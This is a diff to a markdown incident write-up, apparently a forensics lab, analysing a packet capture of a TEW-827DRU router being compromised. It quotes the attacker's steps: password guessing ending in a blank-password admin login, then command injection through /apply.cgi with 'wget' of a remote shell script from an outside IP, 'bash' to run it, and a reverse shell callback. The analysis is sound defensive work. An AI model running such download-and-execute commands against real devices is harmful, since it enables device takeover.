@@ -57,8 +57,8 @@ This immediately suggested that application-layer analysis (HTTP) would be criti
 
 Using Conversations, I identified the primary communicating systems:
 
-- 192.168.10.1 → Router (TEW-827DRU, Firmware 2.10)
-- 192.168.10.2 → Internal endpoint interacting with the router
+- `192.168.10.1` → Router (TEW-827DRU, Firmware 2.10)
+- `192.168.10.2` → Internal endpoint interacting with the router
 
 ![](./Screenshots/top_talkers.PNG)
 
@@ -73,20 +73,20 @@ This isolates inbound traffic to the router, which became the main point of the 
 **Login Interface Interaction**
 
 Inspection of HTTP traffic revealed that the attacker first accessed the router’s login interface:
-- Timestamp: 15:52:40
+- Timestamp: `15:52:40`
 - Method: HTTP GET requests to load login page
 
 **Authentication Attempts**
 
 Shortly after, multiple POST requests were observed:
 - Endpoint: `/apply_sec.cgi`
-- Timeframe: 15:52:40 – 15:53:27
+- Timeframe: `15:52:40 – 15:53:27`
 
 Analysis of POST bodies showed:
 
 - Repeated authentication attempts targeting the admin account
 - Multiple password guesses
-- Successful authentication using a blank password at 15:53:27
+- Successful authentication using a blank password at `15:53:27`
 
 
 **Assessment**
@@ -115,7 +115,7 @@ This field was used to inject shell commands into the router’s configuration.
 
 **Observed Command Injection**
 
-Between **15:56:16 – 16:08:08**, multiple malicious payloads were observed:
+Between `15:56:16 – 16:08:08`, multiple malicious payloads were observed:
 - `whoami`
 - `wget http://35.159.25.253:8000/a1l4m.sh`
 - `bash a1l4m.sh`
@@ -142,11 +142,11 @@ Mapped to:
 
 | Time                | Activity                           |
 | ------------------- | ---------------------------------- |
-| 15:52:40            | Router login page requested        |
-| 15:52:40 - 15:53:27 | Authentication attempts            |
-| 15:53:27            | Successful login (blank password)  |
-| 15:56:16 - 16:08:08 | Command injection via `/apply.cgi` |
-| Shortly after       | Reverse shell callback initiated   |
+| `15:52:40`            | Router login page requested        |
+| `15:52:40 - 15:53:27` | Authentication attempts            |
+| `15:53:27`            | Successful login (blank password)  |
+| `15:56:16 - 16:08:08` | Command injection via `/apply.cgi` |
+| `Shortly after`      | Reverse shell callback initiated   |
 
 <br>
 
